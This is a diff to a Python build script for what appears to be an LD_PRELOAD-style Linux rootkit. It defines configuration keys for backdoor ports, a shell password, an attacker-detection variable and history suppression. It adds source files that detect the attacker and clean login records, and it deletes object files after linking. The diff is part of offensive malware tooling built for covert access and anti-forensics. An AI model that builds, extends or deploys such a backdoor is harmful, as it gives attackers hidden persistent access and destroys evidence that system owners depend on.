@@ -69,12 +69,13 @@ CONFIG_KEYS = {
         "PAM_USER": type_hidden_literal,
         "LOW_BACKDOOR_PORT": type_int,
         "HIGH_BACKDOOR_PORT": type_int,
-        "PASSWORD": type_hidden_literal,
+        "SHELL_PASSWORD": type_hidden_literal,
         "SHELL_MOTD": type_hidden_literal,
         "SHELL_TYPE": type_hidden_literal,
         "_ENV_IS_ATTACKER": type_hidden_literal,
         "_ENV_NO_HISTFILE": type_hidden_literal,
         "_ENV_XTERM": type_hidden_literal,
+        "HIDDEN_ENV_VAR": type_hidden_literal,
         }
 
 def get_config(lines, check_missing_vars=True):
@@ -329,6 +330,8 @@ def run_build_command(cmd):
 SOURCES = [
         "src/init.c",
         "src/drop_shell_backdoor.c",
+        "src/is_attacker.c",
+        "src/cleanup_login_records.c",
         ]
 # automagically add every hooks to SOURCES
 SOURCES += glob("src/hooks/*.c")
@@ -366,6 +369,9 @@ else:
 
 run_build_command("{CC} -fPIC -shared " + set_ld_soname \
         + objects + " {LDFLAGS} -o {LIBRARY_NAME}")
+
+# remove object files afterwards
+run_build_command("rm -f " + objects)
 
 # strip if no debug mode
 if config["DEBUG_LEVEL"] == 0:
